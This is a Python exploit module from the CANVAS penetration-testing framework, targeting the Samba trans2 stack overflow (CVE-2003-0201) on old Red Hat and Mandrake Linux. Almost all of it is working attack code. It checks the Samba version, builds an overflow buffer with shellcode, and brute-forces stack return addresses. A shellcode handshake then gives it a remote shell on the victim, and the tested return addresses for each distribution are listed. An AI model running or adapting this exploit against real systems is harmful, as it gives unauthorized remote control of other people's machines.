#! /usr/bin/env python
"""

SAMBA trans2 Stack Overflow

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""


"""


notes="""
tested on:
    Red Hat Linux release 8.0 (Psyche): samba-2.2.7-4.8.0.rpm kernel: 2.4.18-14, Worked with address: 0xbffff204
    Red Hat 7.3 samba 2.2.3a: samba-2.2.3a-6.rpm, Worked with address: 0xbffff204
    Red Hat Linux release 7.2 (Enigma): samba-2.2.1a-4.rpm kernel: 2.4.7-10, Worked with address: 0xbffff604
    Red Hat Linux release 7.1 (Seawolf): samba-2.0.7-36: NOT VULNERABLE
    Mandrake Linux release 8.2 (Bluebird) for i586: samba-2.2.3a-10mdk kernel: 2.4.18-6mdk, Worked with address: 0xbffff204
"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: dave@immunityinc.com
#

import os,getopt
import sys


sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import socket
from exploitutils import *

import addencoder

import win32shell
import linuxshell
import time
from tcpexploit import tcpexploit
import urllib
#samba stuff
from samba_client import SAMBAClient
from samba_client import SAMBAException
import smb
import nmb
from libs.ctelnetlib import Telnet

from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import canvasengine
from linuxNode import linuxNode

NAME="samba_trans2"
#TODO: FIX THESE
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Samba"
DOCUMENTATION["Date public"]="Apr 07, 2003"
DOCUMENTATION["CERT Advisory"]=""
DOCUMENTATION["CVE Name"] = "CVE-2003-0201"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0201"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://www.redhat.com/support/errata/RHSA-2003-137.html"
DOCUMENTATION["Versions Tested"] = "\nRed Hat Linux release 8.0 (Psyche): samba-2.2.7-4.8.0.rpm kernel: 2.4.18-14\n"+\
             "Red Hat Linux release 7.3 x86 samba 2.2.3a: samba-2.2.3a-6.rpm\n"+\
             "Red Hat Linux release 7.2 (Enigma): samba-2.2.1a-4.rpm kernel: 2.4.7-10\n"+\
             "Mandrake Linux release 8.2 (Bluebird) x586:samba-2.2.3a-10mdk.rpm"

DESCRIPTION="Samba Trans2 Stack Overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Linux"] ]

GTK2_DIALOG="dialog.glade2"


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit



class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.mysmbclient=SAMBAClient()
        self.setPort(139)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x00\\/.:?\r\n%?"
        self.user=None
        self.password=None
        self.name=NAME
        return

    def createShellcode(self):
        self.log("Using GO Linux findsck shellcode with MOSDEF")
        import shellcodeGenerator
        self.createLinuxGOShellcode(self.badstring) #initial shellcode
        myshellcode=shellcodeGenerator.linux_X86()
        myshellcode.addAttr("read_and_exec",{"fdreg": "ebx"})
        self.stage2=myshellcode.get()
    
    def neededListenerTypes(self):
        return []

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        try:
            self.mysmbclient.do_smb_connect(self.host, self.user, self.password)
            remote_ver = self.mysmbclient.get_lanman_version()
            if remote_ver.find("Samba") == -1:
                return 0
            try:
                #Samba 2.2.7
                name, ver = remote_ver.split("\x20") 
                major, med, minor = ver.split(".")
                #print name, ver
                #print major, med, minor
                
                if int(major) > 2:
                    return 0
                #only 2.2.x is vulnerable, not 2.0.x
                if int(med) != 2:
                    return 0
                
                #check for 2.2.8a
                if len(minor) > 1:
                    if int(minor[0]) < 8:
                        return 1
                    if int(minor[0]) == 8 and int(minor[1]) >= 61:
                        return 0 

                if int(minor) <= 8:
                    return 1
                else:
                    return 0
            except:
                print "problem in version parsing ..."
                #if something goes wrong on parsing return vulnerable,
                #so that it can be verified manually. 
                return 1
        except:
            return 0
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

    
        self.socknode = self.argsDict["passednodes"][0]
        if not self.test():
            self.log("This does not appear to be a Unix machine running Samba...")
            return 0

        self.known_addr_range = [0xbffed404L, 0xbffff804L]
        #self.known_addr_range = [0xbfffdc04L, 0xbffff804L]

        self.retaddr_base = self.known_addr_range[0]
        self.retaddr_top = self.known_addr_range[1]
        self.increment = 0x100
        
        self.log("[*]  brute forcing well known addr range ... [*]")
        time.sleep(2)
        res = self.brute_loop()
        if res!=None:
            self.log("Worked with address: 0x%8.8x"%self.retaddr_base)
            self.setInfo("%s attacking %s:%d (worked!)"%(NAME,self.host,self.port))
            return res

        self.log( "[*]  brute forcing a larger range ...    [*]")
        time.sleep(2)
        self.retaddr_base = 0xbffe2104L
        self.retaddr_top = 0xbfffffffL
        self.increment = 0x100
        res=self.brute_loop()
        if res!=None:
            self.log("Worked with address: 0x%8.8x"%self.retaddr_base)
            self.setInfo("%s attacking %s:%d (worked!)"%(NAME,self.host,self.port))

            return res
        
        self.setInfo("%s attacking %s:%d (failed.)"%(NAME,self.host,self.port))
        return None
        
    def brute_loop(self):
        
        while self.retaddr_base < self.retaddr_top: 
            self.log( "trying; retaddr: 0x%08x\r" % self.retaddr_base)
            if self.exploit(self.retaddr_base)==-1:
                break
            sck = self.mysmbclient.get_sock()

            if linuxshell.doGOhandshake(sck,secondstage=self.stage2):
                self.log("GO Code Passed...Loading second stage")
                import linuxMosdefShellServer
                try:
                    node=linuxNode()
                    node.parentnode=self.socknode
                    linuxMosdefShellServer.linuxshellserver(sck,node,logfunction=self.logfunction)
                    self.log("Calling startup for MOSDEF shell server")
                    node.startup()
                    self.setInfo("%s attacking %s:%d (succeeded)"%(NAME,self.host,self.port))
                    return node
                except:
                    self.log("Could not make a MOSDEF shell listener - connection was closed. Exploit most likely failed.")
                    import traceback
                    print '-'*60
                    traceback.print_exc(file=sys.stdout)
                    print '-'*60
                    return None      
                
            time.sleep(0.2)
            self.retaddr_base += self.increment
        return None
            

    def setup(self):
        try:
            self.mysmbclient.do_smb_connect(self.host, self.user, self.password) 
        except smb.SessionError, err:
            raise SAMBAException, "SAMBAExploit, Host: " + str(self.host) + " " + str(err)
        except socket.error:
            self.log("Could not connect...")
            return 0
        return 1
        
        
    def exploit(self, retaddr):

        if not self.setup():
            self.log("Unable to continue - returning.")
            return -1
        

        self.ovf = "A" * (1076 - len(self.shellcode) - 400) + self.shellcode +\
                   "B" * 400 + intel_order(retaddr) + intel_order(retaddr) +\
                   intel_order(0x0804b3b0)
        
        #print "attach"
        #raw_input()
        
        self.mysmbclient.do_smb_trans2(self.ovf)
        return 1
    
    def displayVersions(self):
        print "1 - Linux (RedHat/Mandrake) Brute Force"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)   
    if ret not in [0,1,None]:
        ret.interact()

